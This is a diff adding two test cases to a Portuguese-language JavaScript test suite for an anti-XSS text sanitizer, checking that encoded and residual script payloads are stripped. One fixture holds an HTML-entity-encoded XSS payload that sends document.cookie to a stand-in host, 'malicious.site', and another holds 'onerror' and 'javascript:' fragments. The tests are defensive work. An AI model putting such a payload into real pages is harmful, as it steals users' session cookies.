@@ -39,4 +39,16 @@ describe("Segurança & Sanitização de Entradas (Anti-XSS)", () => {
     const sanitized = sanitizePlainText(legitimate);
     assert.equal(sanitized, legitimate);
   });
+
+  test("7. Neutraliza payloads codificados em HTML entities (&lt;img src=x onerror=...&gt;)", () => {
+    const encoded = "&lt;img src=x onerror=fetch('https://malicious.site/c?'+document.cookie)&gt;";
+    const sanitized = sanitizePlainText(encoded);
+    assert.equal(sanitized, "");
+  });
+
+  test("8. Remove event handlers residuais e links javascript:", () => {
+    const mixed = "Preciso de acesso onerror=alert(1) para javascript:void(0) campanha";
+    const sanitized = sanitizePlainText(mixed);
+    assert.equal(sanitized, "Preciso de acesso  para  campanha");
+  });
 });
